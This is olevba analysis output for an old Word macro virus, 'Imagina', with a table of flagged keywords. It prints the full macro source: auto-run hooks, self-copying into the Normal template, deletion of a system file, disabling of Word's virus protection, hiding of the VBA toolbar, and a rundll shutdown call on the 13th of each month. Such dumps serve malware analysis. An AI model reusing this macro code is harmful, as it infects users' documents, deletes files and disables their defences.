olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Imagina
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Imagina - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Imagina - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error Resume Next
Dim myMsg, Style, Title, Help, Ctxt, Response, MyString
myMsg = "What a bad day!"   ' Define message.
Style = vbCritical   ' Define buttons.
Title = "Hail Imagina!"  ' Define title.
Help = "DEMO.HLP"   ' Define Help file.
Ctxt = 1000 ' Define topic
        

Call mygame
If ((Month(Date) = 5) And (Day(Date) = 16)) Then
    Application.Caption = "Happy Birthday Imagina!!!"
End If

If ((Month(Date) = 2) And (Day(Date) = 14)) Then
    Application.Caption = "Imagina greets u a Happy Valentines Day"
End If
If (Day(Date) = 1) Then
    Application.Caption = "Imagina greets u a pleasant Day"
End If
If (Day(Date) = 13) Then
Response = MsgBox(myMsg, Style, Title, Help, Ctxt)
    Shell ("rundll user,#7 0 5")
End If

End Sub
Sub Autoclose()
On Error Resume Next
Call mygame
End Sub
Sub autoopen()
On Error Resume Next
Call mygame
End Sub

Sub mygame()
On Error Resume Next
Call simple
Kill ("c:\windows\system\iosubsys\hsflop.pdr")
Application.VBE.ActiveVBProject.VBComponents("imagina").Export "c:\windows\system\iosubsys\imagina.sys"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "imagina" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "imagina" Then ActivInstall = True
Next I

If ActivInstall = True And NormInstall = False Then Set Dobj = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set Dobj = ActiveDocument.VBProject
Dobj.VBComponents.Import ("c:\windows\system\iosubsys\imagina.sys")
End Sub

Sub simple()
    On Error Resume Next
    Application.UserName = "Mr. Secret"
    Application.UserAddress = "AMACLC ILOILO"
    Application.UserInitials = ""
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "Mr. Secret"
        .Title = "Hail Imagina"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
    CustomizationContext = NormalTemplate
    
    End Sub

Sub viewvbcode()
End Sub
Sub toolsmacro()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |Autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

